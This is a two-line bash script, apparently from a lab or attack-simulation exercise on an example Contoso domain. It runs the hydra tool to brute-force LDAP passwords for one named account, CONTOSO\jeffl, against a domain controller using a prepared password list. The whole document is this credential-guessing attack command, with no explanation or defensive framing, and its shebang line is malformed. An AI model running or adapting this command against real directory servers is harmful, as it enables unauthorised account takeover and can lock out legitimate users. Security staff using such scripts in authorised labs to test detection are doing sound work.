#/bin/bash
hydra -l CONTOSO\\jeffl -P passwordsList_jeffl.txt ldap3://contosodc.contoso.azure
